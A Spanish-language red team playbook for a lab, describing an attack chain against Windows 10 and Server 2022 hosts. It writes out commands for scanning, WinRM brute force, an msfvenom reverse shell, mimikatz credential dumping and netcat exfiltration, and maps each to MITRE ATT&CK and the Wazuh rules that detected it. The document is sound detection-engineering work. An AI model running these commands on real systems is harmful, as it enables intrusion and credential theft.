# Red Team Playbook — SOC Lab

## Introducción
Este playbook documenta las técnicas de ataque ejecutadas en el SOC Lab contra hosts Windows 10 y Windows Server 2022. Cada técnica está mapeada al framework MITRE ATT&CK y tiene su correspondiente detección en Wazuh.

## Infraestructura
| Host | IP | Rol |
|---|---|---|
| Wazuh Manager | 192.168.100.10 | SIEM |
| Kali Linux | 192.168.100.20 | Atacante |
| Windows 10 | 192.168.100.30 | Víctima |
| Windows Server 2022 | 192.168.100.40 | Víctima |

## Fase 1 — Reconocimiento
**Técnica MITRE:** T1046 — Network Service Discovery

### Comandos
nmap -sS -sV -O -p 1-1000 192.168.100.30
nmap -sT -p 135,139,445,3389,5985 192.168.100.30

### Resultado
Puerto 5985 (WinRM) abierto. Puertos 135,139,445,3389 filtrados.

### Detección Wazuh
- Regla 92110 — WinRM activity detected
- Sysmon EventID 3

## Fase 2 — Fuerza Bruta
**Técnica MITRE:** T1110 — Brute Force

### Comandos
hydra -l Administrador -P /usr/share/wordlists/rockyou.txt -s 5985 192.168.100.30 http-get /wsman

### Resultado
Patrón de fuerza bruta detectado — múltiples conexiones WinRM en segundos.

### Detección Wazuh
- Regla 92110 — WinRM activity
- Regla 100002 (custom) — Brute Force via WinRM (Level 10)

## Fase 3 — Reverse Shell
**Técnica MITRE:** T1059.003 — Windows Command Shell

### Comandos
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.20 LPORT=4444 -f exe -o /tmp/payload.exe
nc -lvnp 4444

### Resultado
Shell reversa establecida desde win10 hacia Kali puerto 4444.

### Detección Wazuh
- Regla 92052 — cmd.exe iniciado por proceso anormal
- Regla 92031 — Discovery activity ejecutada
- Regla 92066 — Binary en ubicación sospechosa

## Fase 4 — Credential Access
**Técnica MITRE:** T1003.001 — LSASS Memory

### Comandos
iwr http://192.168.100.1:8080/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

### Resultado
Hash NTLM extraído exitosamente de memoria LSASS.

### Detección Wazuh
- Regla 92066 — mimikatz.exe en ubicación sospechosa lanzado por PowerShell

## Fase 5 — Exfiltración
**Técnica MITRE:** T1041 — Exfiltration Over C2 Channel

### Comandos
nc -lvnp 5555 > /tmp/datos_exfiltrados.txt
PowerShell TcpClient hacia 192.168.100.20:5555

### Resultado
Archivo confidencial exfiltrado exitosamente al host atacante.

### Detección Wazuh
- Regla 533 — Puerto 5555 abierto detectado en Kali

## Cadena de Ataque Completa

Reconocimiento → Fuerza Bruta → Reverse Shell → Credential Dumping → Exfiltración

## Resumen de Detecciones

| Fase | Técnica MITRE | Regla Wazuh | Level |
|---|---|---|---|
| Reconocimiento | T1046 | 92110 | 4 |
| Fuerza Bruta | T1110 | 100002 (custom) | 10 |
| Reverse Shell | T1059.003 | 92052, 92031 | 4 |
| Credential Dumping | T1003.001 | 92066 | 4 |
| Exfiltración | T1041 | 533 | 7 |
